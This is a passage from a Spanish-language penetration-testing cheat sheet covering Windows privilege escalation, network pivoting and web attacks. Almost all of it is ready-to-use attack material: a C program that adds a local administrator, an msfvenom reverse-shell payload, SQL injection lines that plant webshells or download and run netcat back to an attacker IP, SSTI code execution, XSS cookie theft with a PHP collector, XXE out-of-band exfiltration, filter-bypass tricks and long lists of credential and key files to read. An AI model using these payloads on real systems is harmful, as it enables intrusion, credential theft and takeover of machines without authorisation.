| -------- | ----------------------- |
| F        | Full access             |
| M        | Modify access           |
| RX       | Read and execute access |
| R        | Read-only access        |
| W        | Write-only access       |


##### Enumeración de Permisos

```bash
icacls "C:\\Ruta\\al\\binario\\<binario>"
```

En nuestra máquina atacante, creamos un binario malicioso el cual crea un nuevo usuario y lo agrega al grupo de administradores.

**adduser.c**

```bash
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user elliot Password123@! /add");
  i = system ("net localgroup administrators elliot /add");

  return 0;
}
```

##### Compilamos el código

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

##### Transferimos el binario a la máquina víctima

```bash
iwr -uri <http://192.168.56.5/adduser.exe> -Outfile adduser.exe
```

##### Movemos el binario a la ruta correspondiente

```bash
move .\\adduser.exe "C:\\Ruta\\al\\binario\\<binario>"
```

##### Ejecución

```bash
net stop <SERVICE>
net start <SERVICE>
```

Alernativamente si no tenemos privilegios para reiniciar el servicio, podemos comprobar si el servicio se inicia al iniciar el sistema y si tenemos la capacidad para reiniciar la máquina.

```bash
whoami /priv
```

##### PowerUp

```powershell
powershell -ep bypass
. .\\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```

##### Enumeración de propiedades de ejecución del servicio

```bash
$ModifiableFiles = echo 'C:\\PATH\\TO\\BINARY\\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\\PATH\\TO\\BINARY\\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\\PATH\\TO\\BINARY\\<BINARY>.exe argument -conf=C:\\temp\\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```

#### Tareas Programadas (Scheduled Tasks)

Las **Scheduled Tasks** (Tareas Programadas) en Windows son una función del sistema operativo que permite automatizar la ejecución de programas, scripts o comandos en momentos específicos o bajo ciertas condiciones. Estas tareas se pueden configurar para que se ejecuten diariamente, semanalmente, mensualmente, al iniciar el sistema, al iniciar sesión, o incluso cuando ocurren eventos específicos. Son útiles para realizar mantenimiento automático, backups, actualizaciones, o cualquier tarea repetitiva sin necesidad de intervención manual.

```powershell
# Listar las tareas programadas
schtasks /query /fo LIST /v
Get-ScheduleTask
Get-ScheduledTask | Where-Object { $_.Author -and $_.Author -notmatch 'Microsoft|SYSTEM|S-1-5-18|S-1-5-19|S-1-5-20' } | Select-Object TaskName, Author, @{Name='TaskToRun'; Expression={$_.Actions.Execute}}, NextRunTime
```

Cuando listamos las tareas programadas deberíamos buscar información interesante, como el autor, el nombre de la tarea, la tarea a ejecutar, el usuario que ejecuta la tarea y la próxima ejecución de la tarea.

Buscamos la ruta de la tarea a ejecutar y comprobamos si tenemos permisos de escritura en esa ruta, para poder remplazar el binario.


```powershell
icacls C:\\Ruta\\Al\\Binario\\<BINARY>.exe
```

Reutilizamos el binario `adduser.exe` el cual crea y agrega un nuevo usuario al grupo administrador (esto depende del usuario que este ejecutando la tarea) o también podemos lanzarnos una reverse shell.

```c
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user elliot Password123! /add");
  i = system ("net localgroup administrators elliot /add");

  return 0;
}
```

Creamos un servidor HTTP con Python y transferimos el binario a la máquina víctima.

```bash
iwr -uri <http://192.168.56.5/adduser.exe> -Outfile <BINARY>.exe
```

Movemos el binario a la ruta del binario original para remplazarlo.

```bash
move .\\<BINARY>.exe C:\\Ruta\\Al\\Binario\\
```

#### Print Operators

El grupo **Print Opertaros** en Windows está destinado a usuarios que necesitan gestionar impresoras y trabajos de impresión. Los miembros de este grupo pueden realizar tareas como configurar impresoras, administrar colas de impresión y ejecutar funciones relacionadas con el servidor de impresión. Aunque estos permisos están enfocados en tareas de impresión, en determinadas circunstancias podrían ser explotados para escalar privilegios en un sistema Windows.

##### Escalada de Privilegios a través del Grupo de Operadores de Impresión y el Controlador Capcom.sys

El grupo **Print Operators** es un grupo con privilegios elevados en Windows que otorga a sus miembros permisos significativos, entre los que se incluyen:

- **SeLoadDriverPrivilege**: Permite a los miembros cargar y gestionar controladores del sistema.
- **Gestión de impresoras**: Capacidad para crear, compartir, administrar y eliminar impresoras conectadas a un controlador de dominio.
- **Acceso local a controladores de dominio**: Los miembros pueden iniciar sesión localmente en un controlador de dominio y apagarlo.

Estos privilegios permiten a los miembros del grupo cargar controladores del sistema, lo que puede ser explotado para realizar acciones con mayores privilegios en el sistema.

##### Uso de Capcom.sys para la Escalada de Privilegios

El controlador `Capcom.sys` es un controlador conocido que permite ejecutar código con privilegios de sistema. Este controlador puede ser utilizado para escalar privilegios en un entorno Windows. A continuación, se describe el proceso:

**1. Descargar el Controlador Capcom.sys**
    El controlador `Capcom.sys` puede descargarse desde el siguiente repositorio de GitHub:
    [Capcom-Rootkit - Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

    Además, se pueden encontrar herramientas útiles como `LoadDriver.exe` y `ExploitCapcom.exe` en el siguiente repositorio:
    [SeLoadDriverPrivilege - Josh Morrison](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)

**2. Crear un Ejecutable Malicioso**
    Utilizando Metasploit, creamos un ejecutable malicioso (por ejemplo, `rev.exe`) que proporcione un reverse shell al ejecutarse. Este ejecutable se ejecutará con privilegios elevados una vez que se cargue el controlador `Capcom.sys`.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > rev.exe
```

**3. Cargar el Controlador Capcom.sys**

Utilizamos la herramienta `LoadDriver.exe` para cargar el controlador `Capcom.sys`. El comando a ejecutar es el siguiente:

```powershell
.\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\Test\Capcom.sys
```

Si la ejecución es exitosa, el comando debería devolver:

```powershell
NTSTATUS: 00000000, WinError: 0
```

Si no es así, verifique la ubicación de Capcom.sys y asegúrese de que está ejecutando `LoadDriver.exe` desde el directorio correcto.

**4. Ejecutar el Ejecutable Malicioso**

Una vez cargado el controlador, utilizamos `ExploitCapcom.exe` para ejecutar el ejecutable malicioso con privilegios elevados:

```powershell
.\ExploitCapcom.exe C:\Temp\rev.exe
```

Este comando ejecutará el archivo `rev.exe` con privilegios de sistema, proporcionando al atacante un reverse shell.

#### Servicios - binPath

Similar al ataque de permisos en los servicios, podemos comprobar los permisos de un servicio para ver si podemos modificarlo.

```powershell
accesschk.exe /accepteula -uwcqv <SERVICE>
```

Si tenemos el permiso `SERVICE_CHANGE_CONFIG` podemos manipular un servicio.

```powershell
sc.exe config <SERVICE> binpath= "net localgroup administrators user /add"
```

```
sc stop <SERVICE>
sc start <SERVICE>
```

### Utilidades

Modificar el siguiente registro para permitir el acceso vía RDP como Administrator.

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Pivoting

### Chisel - Socat

#### Kali

```bash
chisel server -p 8000 --reverse --socks5
```

##### Cliente (Víctima)

##### Linux

```bash
./chisel client <IP-CHISEL-SERVER>:8000 R:socks
./chisel client <IP-CHISEL-SERVER>:8000 R:3000:127.0.0.1:3000
```

##### Windows

```powershell
.\chisel.exe client <ipKali>:8000 R:4444:socks 9001:127.0.0.1:9001 8888:127.0.0.1:80
```

- Proxy socks en puerto Kali 4444
- Mapea 9001 MS01 a 9001 Kali
- Mapea 8888 MS01 a 80 Kali

#### Socat

Port Forwarding

```bash
./socat tcp-listen:2222,fork,reuseaddr tcp:10.10.10.5:8000 &
```

Exponer un puerto local

```bash
socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
```

> En este caso, el puerto 8080 no esta expuesto fuera del equipo local, pero con el comando anterior exponemos el puerto hacia fuera a través del puerto 8282.

### Ligolo-NG

### Descargar el Proxy y el Agente

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.7.5_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.7.5_Linux_64bit.tar.gz
```

### Preparar las interfaces para el tunel

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Configurar proxy en Kali

```bash
./proxy -laddr <LHOST>:443 -selfcert
```

### Configurar el agente en la máquina víctima

```bash
./agent -connect <LHOST>:443 -ignore-cert
```

### Configurar la sesión

```bash
ligolo-ng » session
[Agent : user@target] » start
```

```bash
sudo ip route add 172.16.1.0/24 dev ligolo
```

### Port Forwarding

```bash
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```


## Web

### SQL Injection

#### MySQL

**Obtener el número de columnas**

```sql
-- Obtener el número de columnas
-1 ORDER BY 3;#
-1 ORDER BY 3;--1-

-- Obtener la versión
-1 UNION SELECT 1,VERSION(),3;#

-- Obtener el nombre de la base de datos en uso
-1 UNION SELECT 1,DATABASE(),3;#

-- Obtener nombre de las tablas
-1 UNION SELECT 1,2, GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE>";#

-- Obtener el nombre de las columnas
-1 UNION SELECT 1,2, GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="<DATABASE>" AND TABLE_NAME="<TABLE>";#

-- Leer un archivo
SELECT LOAD_FILE('/etc/passwd')

-- Dump Data
-1 UNION SELECT 1,2, GROUP_CONCAT(<COLUMN>) FROM <DATABASE>.<TABLE>;#

-- Crear una Webshell
LOAD_FILE('/etc/httpd/conf/httpd.conf')
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php";

LOAD_FILE('/etc/httpd/conf/httpd.conf')
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

#### MSSQL

**Bypass de Autenticación**
```sql
' or 1=1--
```

**Obtener la versión con una Time-Based Injection**
```sql
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

**Habilitar xp_cmdshell**

```sql
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**Ejeecución Remota de Comandos (RCE)**

```sql
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
```

```sql
' EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.206:/nc.exe C:\windows\temp\nc.exe';EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.206 4444 -e cmd.exe';--
```

#### Oracle SQL

**Bypass de Autenticación**

```sql
' or 1=1--
```

**Obtener el número de columnas**

```sql
' order by 3--
```

**Obtener el nombre de la tabla**

```sql
' union select null,table_name,null from all_tables--
```

**Obtener el nombre de la columna**

```sql
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
```

**Dump Data**

```sql
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

#### Error-based SQL Injection (SQLi)

```sql
<USERNAME>' OR 1=1 -- //
```

Genera la siguiente consulta

```sql
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```

```sql
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

#### UNION-based SQL Injection (SQLi)

**Inyección SQL manual - Pasos**

```sql
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search"]."%'";

' ORDER BY 1-- //

%' UNION SELECT database(), user(), @@version, null, null -- //

%' UNION SELECT database(), user(), @@version, null, null -- //

' UNION SELECT null, null, database(), user(), @@version  -- //

' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //

' UNION SELECT null, username, password, description, null FROM users -- //
```

#### Blind SQL Injection (SQLi)

```sql
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

### SQL Truncation Attack

```bash
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

### Server-Side Template Injection (SSTI)

#### Inclusión de archivos locales (LFI)

Podemos utilizar la función incorporada de Python `open`para incluir un archivo local. Sin embargo, no podemos llamar a la función directamente; necesitamos llamarla desde el diccionario `__builtins__` que descartamos anteriormente. Esto genera la siguiente carga útil para incluir el archivo `/etc/passwd`:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

#### Ejecución remota de código (RCE)

Para lograr la ejecución remota de código en Python, podemos utilizar funciones proporcionadas por el `os`biblioteca, como por ejemplo `system` o `popen`Sin embargo, si la aplicación web aún no ha importado esta biblioteca, primero debemos importarla llamando a la función incorporada `import`, esto da como resultado la siguiente carga útil SSTI:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Cross-Site Scripting (XSS)

```javascript
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src="file:///etc/passwd" height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
"><script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

#### Petición vía Ajax - GET

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

#### Petición vía Ajax - POST

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### Comprimir script

```javascript
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

```html
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)};
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```

#### Robo de Cookie a través de XSS

1. Creación de archivo php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

2. scripts.js

```js
new Image().src='http://10.10.14.131:9000/index.php?c='+document.cookie
```

3. Creamos un servidor HTTP con PHP para compartir los recursos

```bash
sudo php -S 0.0.0.0:9000
```

4. Enviamos el Payload

```html
"><script src=http://10.10.14.131:9000/script.js></script>
```

### XXE

| **Código**                                                                         | **Descripción**                                          |
| ---------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                                | Definir entidad externa mediante una URL                 |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                        | Defina la entidad externa en una ruta de archivo         |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Leer código fuente PHP con filtro de codificación base64 |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`        | Error al leer un archivo mediante PHP                    |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`  | Lectura de un archivo OOB exfiltración                   |

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

##### XXE Out-of-band Data Exfiltration

Creamos un archivo llamado `xxe.dtd` con el siguiente contenido:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Creamos un archivo `index.php` con el siguiente contenido:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Creamos un servidor http con php para compartir el archivo.

```bash
php -S 0.0.0.0:8000
```

Payload a enviar en la solicitud:

```c
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.10:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Finalmente, podemos volver a nuestra terminal y veremos que, efectivamente, recibimos la solicitud y su contenido decodificado.


### Inyección de comandos

| **Operador de inyección** | **Personaje de inyección** | **carácter codificado en URL** | **Comando ejecutado**                                        |
| ------------------------- | -------------------------- | ------------------------------ | ------------------------------------------------------------ |
| Punto y coma              | `;`                        | `%3b`                          | Ambos                                                        |
| Nueva línea               | `\n`                       | `%0a`                          | Ambos                                                        |
| Background                | `&`                        | `%26`                          | Ambos (generalmente se muestra primero el segundo resultado) |
| Pipe                      | `\|`                       | `%7c`                          | Ambos (solo se muestra la segunda salida)                    |
| AND                       | `&&`                       | `%26%26`                       | Ambos (solo si el primero tiene éxito)                       |
| OR                        | `\|`                       | `%7c%7c`                       | Segundo (solo si el primero falla)                           |
| Subshell                  | ` `` `                     | `%60%60`                       | Ambos (solo Linux)                                           |
| Subshell                  | `$()`                      | `%24%28%29`                    | Ambos (solo Linux)                                           |

#### Omisión de caracteres filtrados (Linux)

| Código                  | Descripción                                                                                      |
| ----------------------- | ------------------------------------------------------------------------------------------------ |
| `printenv`              | Puede utilizarse para ver todas las variables de entorno                                         |
| **Espacios**            |                                                                                                  |
| `%09`                   | Usar tabulaciones en lugar de espacios                                                           |
| `${IFS}`                | Se sustituirá por un espacio y una tabulación. No se puede usar en subprocesos (es decir, `$()`) |
| `{ls,-la}`              | Las comas se sustituirán por espacios.                                                           |
| **Otros caracteres**    |                                                                                                  |
| `${PATH:0:1}`           | Será reemplazado por `/`                                                                         |
| `${LS_COLORS:10:1}`     | Será reemplazado por `;`                                                                         |
| `$(tr '!-}' '"-~'<<<[)` | Desplazar carácter en uno ( `[`-> `\`)                                                           |


#### Omisión de comandos en la lista negra

| Código                                                       | Descripción                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------------- |
| **Inserción de caracteres**                                  |                                                                     |
| `'` o `"`                                                    | El total debe ser par.                                              |
| `$@` o `\`                                                   | Solo Linux                                                          |
| **Manipulación de caracteres**                               |                                                                     |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Ejecutar el comando independientemente de las mayúsculas/minúsculas |
| `$(a="WhOaMi";printf %s "${a,,}")`                           | Otra variante de la técnica                                         |
| **Comandos invertidos**                                      |                                                                     |
| `echo 'whoami' \| rev`                                       | Invierte una cadena                                                 |
| `$(rev<<<'imaohw')`                                          | Ejecutar comando inverso                                            |
| **Comandos codificados**                                     |                                                                     |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Codificar una cadena con base64                                     |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Ejecutar cadena codificada en b64                                   |

### LFI (Local File Inclusion)

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```
#### Hasta php 5.3

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

#### php://filter Wrapper

```c
url=php://filter/convert.base64-encode/resource=app.php
```

#### Linux
> Lista acotada de archivos.

```bash
/app/etc/local.xml
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

#### Windows
> Lista acotada de archivos.

```powershell
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
